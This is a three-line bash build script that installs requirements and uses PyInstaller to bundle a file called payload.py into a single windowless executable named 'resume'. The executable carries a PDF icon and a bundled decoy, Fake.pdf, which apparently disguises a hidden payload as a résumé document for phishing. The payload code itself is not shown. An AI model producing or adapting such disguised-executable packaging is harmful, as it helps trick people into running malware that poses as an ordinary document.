#!/bin/bash
python -m pip install -r requirements.txt
python -m PyInstaller --onefile --noconsole --icon=pdf.ico --add-data "Fake.pdf;." --name resume ./payload.py